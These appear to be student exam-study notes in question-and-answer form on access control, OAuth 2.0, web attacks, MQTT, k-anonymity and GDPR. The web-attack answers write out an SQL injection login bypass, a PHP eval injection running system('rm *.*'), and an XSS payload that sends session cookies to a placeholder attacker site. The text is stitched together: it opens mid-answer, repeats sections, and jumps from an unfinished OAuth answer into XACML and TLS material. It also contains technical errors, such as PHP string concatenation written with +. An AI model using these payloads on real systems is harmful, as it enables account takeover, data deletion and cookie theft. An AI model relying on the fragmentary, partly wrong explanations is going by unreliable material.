  > * **No Write Down**: Subject can write a resource if the resource Security level dominates the subject clearance.(His **clearance level is 'weaker'(or equal) than the Security level** and the **Subject Need to Know is a subset of the Resource Need to Know**)
  >
  >   $(SClearance,SNeedToKnow)<=(RSecurityLevel,RNeedToKnow)\\SNeedToKnow\subseteq RNeedToKnow$
  >
  >   *This is needed because someone could declassify informations.*
  >
  > * **Tranquillity principle:** Nobody can arbitrary change the **Security Level**
  >
  > Bell-La Padula Model gives **Confidentiality**.
  >
  >
  > If we use **Biba Model**, we get **Integrity**:(the opposite of the Bell-La Padula model)
  >
  > * **No Read Down**: We don't want important documents to be influenced by less-important documents.
  > * **No Write Up**: We don't want someone to break integrity of important informations.
  >
  > **Advantages:**
  >
  > * **Not vulnerable to trojans**
  > * **All under control**
  >
  > **Disadvantages**:
  >
  > * **No flexibility.**
  >
  > * Information **Leakages**: 
  >   **Covert Channel in Bell La Padula**: A covert channel is when a resource (that is not meant to be a channel of communication) is used as a channel for communication. 
  >
  >   In Bell- La Padula model, a lower clearance user can create a **dummy.obj**, then the **higher clearance** user changes the permission of the file. The **lower clearance user** ask to read the file. If he can't, he got a bit of information. This switch could be repeated like a $0,1$ data stream.

* Define _No Read Up_ and the _No Write Down_ principles of the MAC model

  > it uses **Bell-La Padula Model**, three policies:
  >
  > - **No Read Up**: Subject can read a resource if his clearance level dominates it. (His **clearance level is 'stronger' (or equal) than the Security level** and the **Resource Need to Know is a subset of the Subject Need to Know**)
  >
  >   $(SClearance,SNeedToKnow)>=(RSecurityLevel,RNeedToKnow)\\SNeedToKnow\supseteq RNeedToKnow$
  >
  >   *This is needed because someone could read confidential information(on a stronger security level), using the Need To Know Principle.*
  >
  > - **No Write Down**: Subject can write a resource if the resource Security level dominates the subject clearance.(His **clearance level is 'weaker'(or equal) than the Security level** and the **Subject Need to Know is a subset of the Resource Need to Know**)
  >
  >   $(SClearance,SNeedToKnow)<=(RSecurityLevel,RNeedToKnow)\\SNeedToKnow\subseteq RNeedToKnow$
  >
  >   *This is needed because someone could declassify informations.*
  >
  > - **Tranquillity principle:** Nobody can instantly change the **NeedToKnow**
  >
  > Bell-La Padula Model gives **Confidentiality**.

* Explain the difference (if any) between the notions of _subject_, _user_ and _principal_ in access control

  > A **subject is a generic requester.** (someone or something that is creating a request)
  >
  > An **user/principal is a human being** that is making a request.

* What is RBAC? How does it simplify administration? Define the notion of _User-Role assignment_ and _Role-Permission assignment_. Define also the notion of _role hierarchy_ together with the mathematical properties it should satisfy. Given UA, PA and RH express the condition under which user u has permission p

  > RBAC is **Role Based Access Control**.
  >
  > RBAC is a combination of:
  >
  > * **Users**: Subject requesting something
  >
  > * **Roles**: set of permissions
  >
  > * **Sessions**: One or more Roles, given by context(To support the Principle of the Least Priviledge). 
  >
  >   A session can have only one user. A user can have more than one session.
  >
  > * **Permissions**
  >
  >   * Operations
  >   * Object/Resource
  >
  > * **User-Assignment:** Each user can have one or multiple roles, Each role is assigned to one or more users.
  >
  > * **Role-Hierarchy**: Each role can have a sub-role. A sub-role extends the permission of the super-role.
  >
  >   This follows this rules:
  >
  >   * **Reflexive**: it works for itself
  >   * **ANTISymmetric**: (role,sub-role) $=$ (sub-role,role) $\iff$ role$=$sub-role
  >   * **Transitive**: (role,sub-role), (sub-role,sub-sub-role), then (role,sub-sub-role).
  >
  > * **Permission-Assignment**: Each role has one or more permission, each permission has one or more role.
  >
  > **User has permission if and only if there exist roles** $r,r'| (user,r')\in UA$ and $r'\succeq r$ and $(r,p)\in PA$
  >
  >
  >
  > There are points of Dynamic **Separation of Duty**(With sessions) and Static Separation of Duty (with **RH** and **UA**). This prevents **Fraud**.
  >
  > It simplifies administration by creating roles: set of permissions that could be given to multple user, leading to a easy to understand and easy to manage situation.

* Explain the Principle of Least Privilege

  > The Principle of the Least Priviledge says that a subject have to know the minimum amount of information to fullify his request.

* Explain the concept of “Confused deputy” and give a concrete scenario of this attack

  > The Confused Deputy Attack is a priviledge escalation attack which consist in obtaining (R/W/X) access to a resource without having direct access on it. Basically using another user that can access a resource to obtain or write data on the resource.
  >
  > * A doesn't have access to the Resource F.
  > * A have access to **execute** the Compiler.
  > * The Compiler is **OS priviledged**, so it can **RWX** the resource **F**
  > * A compiles a file and sets the destination of the resource to the **F** path.
  > * A has now modified/overwritten F without having direct access to it.

* What is a trojan?

  > A trojan is a malware which **hides the true malevolous intentions** and runs like a safe/normal executable.
  >
  > (*Trojan Horse*)

* What is a covert channel? How can a covert channel be created in MAC?

  > **Covert Channel in Bell La Padula**: A covert channel is when a resource (that is not meant to be a channel of communication) is used as a channel for communication. 
  >
  > In Bell- La Padula model, a lower clearance user can create a **dummy.obj**, then the **higher clearance** user changes the permission of the file. The **lower clearance user** ask to read the file. If he can't, he got a bit of information. This switch could be repeated like a $0,1$ data stream.

* How access control can mitigate command injection attacks?

  > Access control can mitigate the command injection attacks by using the **Principle of the least priviledge:**
  >
  > The Principle of the Least Privilege says that a subject have to know the minimum amount of information to fulfill his request.

#### Access control II

* Describe the purpose of OAuth 2.0 and explain what kind of security bad practice is meant to avoid. Describe also which entities are involved

  > Oauth 2.0 is a **delegation protocol** that let users allow applications to **access resources on their behalf.**
  >
  > Oauth was created to avoid the bad practice of giving full access to a third part service by sharing your credentials.
  >
  > It's important to say that:
  >
  > * **OAUTH** is an **Authorization** protocol, it's **NOT** an Authentication protocol, although is possible to authenticate with OpenID Connect.
  > * OAUTH is **more than one protocol** togheter.
  > * The Token format is chosen by Resource Server and Authorization Server, usually they use JWT(Json Web Token).
  > * It relies mainly on **HTTP and TLS** for security.
  >
  > The entities involved are:
  >
  > * **Resource Owner**: The owner of the resource.
  > * **Protected Resource**(usually in Resource Server): The resource which client tries to get.
  > * **Authorization**(and not Authentication) Server: Server that generates OAUTH Token
  > * **Client**(Third Party App): Third party app that is trying to use the resource and ask on behalf of the resource owner
  > * **Oauth TOKEN**: 
  >   * A key to access specifically some resources;
  >   * Generated by Authorization Server;
  >   * Opaque for the client, he doesn't know what does it mean;
  >   * Clear for the Authorization Server and Resource Server.

* Show the main Authorization code flow supported by OAuth 2.0 and say which kind of protocols is used for the communications among the various entities involved

  > Oauth Main flow:
  >
  > 1. **Client ask for Authorization** to the **Resource Owner**, redirecting him/her to the **Authorization Server.**
  > 2. **Resource Owner insert his/her credentials** and authenticate to the **Authorization Server**
  > 3.  **The Authorization Server ask for Resource Owner permissions**, showing what the app wants to use.
  > 4. The Resource Owner confirms, then the **Authorization Server gives to the Resource Owner** an **Authorization Code.**
  > 5. The Resource Owner gives the **Authorization Code to the Client.**
  > 6. The **Client** uses its credentials to **authenticate to the Authorization Server**, along with **Authorization Code.**
  > 7. **Authorization Server gives OAUTH Token** to the **Client**.
  > 8. The **Client** connects to the **Resource Server and ask for the resource**, giving the **OAUTH Token.**
  > 9. If the OAUTH Token is good(**not expired or not revoked**), then **Resource Server gives the Resource to the Client.**
  >
  > The entities involved are:

  > * **Object/Resource**
  >
  > **XACML Flow** is:
  >
  > 1. An user ask for a resource. This goes through ACMechanism, specifically to the PEP.
  > 2. PEP, using XACML, ask to the PDP if the request Permit or Deny.
  > 3. PEP checks using PIP and PRP if it follows the policies, evaluating all the rules with Rules Combining Algorithm.
  > 4. If Permit, returns permit, if Deny Returns Deny.

  > TLS is **not** **adequate for Malware Attacks and Web Attacks.** It sustain a nice amount of attacks in the Network Attack scenario(like MITM), but in a Malware Attack the end device is infected and in the Web Attack the Server Device is infected, so TLS can't properly protect the user.

* Which kind of attackers threaten web applications?

  > The attackers that can hit web applications are:
  >
  > * Malware Attacks (on end device)
  > * Network Attacks (MITM and so on)
  > * Web Attacks (Poisonous website)

* What is an injection attacks? Give at least two examples and the main mitigation measures

  > An **injection attack** is a **remote code execution** type of attack.
  >
  > Two main examples are:
  >
  > * **SQL Injection**:
  >
  >   This vulnerabilities executes SQL while evaluating the query.
  >
  >   Suppose we have 
  >
  >   `SELECT * FROM USER WHERE username='admin' and password="$_GET['pass']";`
  >
  >   in the password input form we are going to type:
  >
  >   `" OR 1=1;--`
  >
  >   This will become
  >
  >   `SELECT * FROM USER WHERE username='admin' and password="" OR 1=1;--;`
  >
  >   Evaluating to `TRUE`, logging as an admin.
  >
  >
  >
  >   A possible mitigation is using **prepared statement and sanitizing the Input before executing(escaping characters, removing 'OR',...)**
  >
  > * **PHP Eval Injection:**
  >
  >   This vulnerabilities uses the `eval()` function in PHP, which evaluates PHP code.
  >
  >   Having a simple calculator that uses `eval()`:
  >
  >   ```php+HTML
  >   <?php
  >   $in=$_GET['calc'];
  >   eval('$result= '+$in+';');
  >   ?>
  >   ```
  >
  >   and a website `http://site.com/calc=10+1`
  >
  >   We can exploit this like that:
  >
  >   `http://site.com/calc=10+1;system("rm *.*")`
  >
  >   this will execute:
  >
  >   ```php+HTML
  >   <?php
  >   $in=$_GET['calc']; //10+1;system("rm *.*")
  >   eval('$result= '+$in+';'); //eval ($result = 10+1;system("rm *.*"););
  >   ?>
  >   ```
  >
  > The main mitigation for both scenario is using a **strong Access Control Policy.**

* What is a CSRF attack? Give an high level description of how to mount it and the main mitigation measures

  > A CSRF Attack is a **Cross Site Request Forgery** attack.
  >
  > Suppose we have site `bank.com`, this site uses a simple form POST to send money from one to another.
  >
  > After loggin in, i visit(using another tab), `sitosicuro.biz`.
  >
  > `sitosicuro.biz`, using background JS(AJAX), as soon as i visit the webpage is sending a post request to `bank.com` to pay `Mario Rossi` with `100k`.
  >
  > The browser, using JS and my authentication cookie, will send the request and the website will transfer money from my account to Mario Rossi account, without even noticing.
  >
  >
  >
  > A **possibile mitigation** is inserting a one-time token in the FORM POST request in the `bank.com` site. 
  >
  > This eludes Same Origin Policy because it won't read data, it's sending data from another website.

* What is an XSS attack? How it's related to the Same Origin Policy? Give an high level description of how to mount it and the main mitigation measures

  > An XSS attack is a Cross Site Scripting Attack. 
  >
  > Suppose we have `site.com/search.php?q=`. This website, whatever i type in to search, is going to write: 
  >
  > ```php
  > <?php
  >     echo "Here your result for"+$_GET['q'];
  > ?>
  > ```
  >
  > here i can type:
  >
  > ```html
  > <script>
  > 	window.open("http://mymalicioussite.com/?cookie="+document.cookie)
  > </script>
  > ```
  >
  > If it works, i'll send my authentication cookie to another website.
  >
  > I can give this link : 
  >
  > `site.com/search.php?q=<script>window.open("http://mymalicioussite.com/?cookie="+document.cookie)</script>`
  >
  > to someone and steal his/her cookies!
  >
  >
  >
  > This can be mitigated by **replacing** $<$ with `&lt;` or by **sanitizing and removing all** tags (or only the dangerous one) from the input.
  >
  > This attack eludes the Same Origin Policy because it's a `<script>` executed in the same page so it has the same origin and it's the page itself sending data outside.

* What is a phishing attack? Give an high level description of how to mount it and the main mitigation measures

  > A **phishing attack** is an attack which consist in letting an unsuspecting user visit a fake/malicious website, copying a true website, to steal personal information(Like login, password, codice fiscale,...)
  >
  > To make this attack our user Giulio receives a mail from paypal.
  >
  > This email is equal to a true paypal mail.
  >
  > This email uses real paypal embedded images, with real links.
  >
  > This email have a big button which is saying `reset your password`.
  >
  > Pressing this, Giulo gets redirected to `https://paypaI.com`(paypa**I**.com $I\ne l$), 
  >
  > The page does spoofing, having the same style/html of the original login page. When giulio put his login to this fake site, the website redirects giulio to the true paypal website, but keeps the login information for itself (and store them for the hacker).
  >
  >
  >
  > A possible mitigation is checking Certificates:
  >
  > * Having HTTPS doesn't mean it's the true website, we have to check if the website certificate is original and it's referring to the true website.
  > * Certification Authorities should avoid creating certificates with similar names (`paypal.com` and `paypaI.com`)
  >
  > We can also **raise awareness** to help people not getting phished.
  >
  > If we are the website who got cloned:
  >
  > * We should notice a spike of
  >
  >   * Changing Password
  >   * Moving Funds
  >   * Password Reset
  >   * Image GET Requests
  >
  > * We should put private information(like user ID or name and surname) into mail we are sending;
  >
  >   This prevents **phishing but it doesn't prevent Spear Phishing**(Phishing focused to one or more users using their private information to make the request seems legit)

* Explain the publish-subscribe pattern

  >The **Publish Subscribe ** pattern is an alternative pattern to the **Client-Server** pattern, used in IoT (M2M) devices.
  >
  >The Publish Subscribe pattern is:
  >
  >* **Many To Many**: I can have more than one producer that sends to more than one consumer;
  >* **Space Decoupling**: Publisher and Subscriber doesn't need to know each other to exchange events;
  >* **Time Decoupling**: Publisher and Subscriber doesn't need to be up at the same time to exchange the event;
  >* **Sync Decoupling**: Publisher and Subscriber doesn't need to be synchronized to exchange events;
  >* **Support of both Pull and Push** Interactions.
  >
  >There are 3 main entities:
  >
  >* **Publisher**: Publish events;
  >
  >* **Subscriber**: Subscribe to a Topic to get events;
  >
  >* **Broker/Event Notification Services/Mediator:** Notify the subscriber of a topic about a new event.
  >
  >  It can be:
  >
  >  * **Centralized**
  >  * **Distribuited**: More **scalable**
  >
  >Everybody knows an **event-schema**, a definite set of **fields**, with a name and a type.
  >
  >A **subscription** is a constraint expressed on the event schema.
  >
  >The **ENS/Broker** will notify the subscriber if and only if event **e matches subscriber s**.
  >
  >To match, the subscriber **must be subscribed** to that topic.
  >
  >The flow is simple:
  >
  >1. A subscriber subscribe to a topic, **telling it to the Broker**;
  >2. A publisher **publish** an event to a **topic**, **sending the event to the Broker;**
  >3. The broker **notify all the subscriber** of that particular topic, as soon as they are up.
  >
  >There are different approaches. These are the two main approaches:
  >
  >1. **Topic-Based**
  >
  >   We have a topic based subscription. A subscriber follow a topic and gets all the notification of that topic.
  >
  >2. **Hierarchy-Based**
  >
  >   As the topic based, but with **nested** topic. If you subscribe to a topic, **you'll get also all the sub-tree notification.**

* What is MQTT? Explain its security issues

  > MQTT (Message Queue Telemetry Trasport) is a Publish Subscribe Protocol with design principles:
  >
  > * Minimize network bandwith
  > * Consider small set of device resource requirements
  > * Ensure reliability with Quality Of Service:
  >   * QoS from 0 to 2, higher is the number, more acknowledgements will be exchanged.
  >
  > it has:
  >
  > * **Publisher**;
  > * **Subscriber**:
  > * **Centralized Broker**;
  > * **Topic to get subscribed**.
  >
  > **Security Issue**:
  >
  > 1. There is no security implementation in the base protocol because of its lightweight design, so it uses TLS/SSL(and adds overhead).
  > 2. **Authentication** can be set, but it's sent in **PlainText** (without SSL/TLS).
  > 3. Authentication doesn't have something to **Limit login attempts,** so it's possible to **Bruteforce.**
  > 4. We can subscribe to all the user topic with `#`, we can subscribe to all system topic with `$SYS/#`
  > 5. This can lead to problems if i try to publish in sys channel or other channel used by IoT system, such as Fire Alarms.

#### Privacy & Data protection

* Define the notion of privacy. What is k-anonimity?

  > Privacy means:
  >
  > * Having **full control of all personal** informations;
  > * High level of difficulty to create **correlations** between data/actions.
  >
  > **K-Anonimity** is a mitigation model to a **linkage attack**.
  >
  > If we have $k$ Individuals, we shouldn't be able to recognize each one of them to the other $k-1$ .
  >
  > This is achieved by data **Generalization** on quasi-identifier.
  >
  > For example:
  >
  > we have no key identifier, two quasi-identifier(Sex,Year) and one sensitive information(Disease).
  >
  > | Sex  | Year | Disease       |
  > | :--- | ---- | ------------- |
  > | M    | 1961 | Cancer        |
  > | M    | 1965 | Heart Disease |
  >
  > This can be **generalized** by doing:
  >
  > | Sex  | Year | Disease       |
  > | :--- | ---- | ------------- |
  > | M    | 196* | Cancer        |
  > | M    | 196* | Heart Disease |
  >
  > We must avoid **suppression**: Generalization causes too much loss of information.
  >
  > This can be attacked by using: 
  >
  > * **Homogeneity attack:**
  >
  >   In the previous example, **if they had the same disease, that generalization was worthless.**
  >
  > * **Background Knowledge Attack:**
  >
  >   Knowing something about the subject (background knowledge).

* What is data protection? 

  > Data protection is a broad theme and include:
  >
  > * safeguarding data
  > * getting consent from the person whose data is being collected
  > * identifying the regulations that apply to the organization in question and the data it
  >   collects
  > * ensuring employees are fully trained in the nuances of data privacy and security

* What is LINDDUN? Define also _linkability_ and _identifiability_

  > LINDDUN is a privacy threat modeling methodology that supports analysts in mitigating privacy threats in software architectures. It's an acronym of:
  >
  > * **Linkability**: Being able to distinguish a correlation between two Item of Interest. This leads to **Identifiability** and **Inference** (Discrimination).
  >* **Identifiability**: Being able to identify a subject within a set of subject. This leads to **Privacy Concern**
  > * **Non Repudiation**: Not Being able to repudiate an accuse, an attacker can prove something that has been done or know by a subject. This leads to **persecution/detention**
  > * **Detectability**: Being able to distinguish the existence of the Item of Interest within a set. This leads to **Information Disclosure.**
  > * **Disclosure of information**: Violation of Confidentiality.
  > * **Unawareness**: Not being aware of what sharing some informations could cause. This leads to **more linkability.**
  > * **Non compliance**: Not following the privacy regulations. This leads to bad **reputation and fines.**
  
* What is the likelihood of an event? What is the impact of an event? What is the risk of an event? What is the risk matrix?

  >**Likelihood**: the probability that an adverse event will occur in the system. Can be expressed as $[\text{Pr. exploitable weakness in the sys}] \times [\text{Pr. weakness is exploited}]$
  >
  >**Impact**: effects of an adverse event on an IT asset in terms of losses in Confidentiality, Integrity and Availability
  >
  >**Risk**: measures how much a system is vulnerable to adverse events. It's expressed as $[\text{Likelihood of adverse event}] \times [\text{Impact  of adverse event}]$
  >
  >**Risk matrix**: is a matrix that has a 5 to 1 scale of likelihood as rows and an 1 to 5 scale of consequences as columns. Inside the matrix there is the product of the corresponding likelihood and consequences. A vulnerability risk can be evaluated inside the matrix: [1 to 4] is good, [4 to 10] is worrying, [above 10] is an unacceptable risk.

* What is the scope of application of the GDPR? Who is the _data controller_? Who is the _data processort_? What is the _Data Subject_? What is the _Data Protection Impact Assessment_? 

  > The GDPR covers all EU citizens' data regardless of where the organization collecting the data is located. It's a regulation that aims privacy and data protection of citizens
  >
  > **Data controller**: the person or company which handle data of data subjects, determining the purposes and means of its processing. They aren't owners of the data.
  >
  > **Data subject**: the user of the system, the only proprietary of his data that gives to data controllers the explicit consent to process it for explicit goals. He can revoke his consent at any time.
  >
  > **Data Processor**: the person or company that which process data on behalf of the controller.
  >
  > **DPIA**: A document that must be produced before the system deploy and updated during its lifetime. It guarantees that the risk to the rights and freedom of the system users is minimal

* Why does the GDPR propose a risk-based approach to data protection?

  > To best assess and mitigate the company and users top risks under GDPR

* What is the difference between the risk evaluated for an organization and the risk of a data processing activity in the GDPR?

  > The risk of a data processing activity in the GDPR should consider the subject risks and not the company ones. For example, a single stolen data record has minimal impact to a data controller, but can have tragic consequences for its subject: the risk should be high because the subject point of view prevails

* Explain how a violation of confidentiality and one of integrity can lead to a “risk to the rights and freedoms” of the data subject

  > A violation of confidentiality can lead to unintended disclosure of personal information. For example, ethnicity or sexual orientation disclosure can lead to discriminations
  >
  > A violation of integrity can lead to wrong data associated to an user, for example someone poor could loose tax reductions because his annual income record has been violated and modified
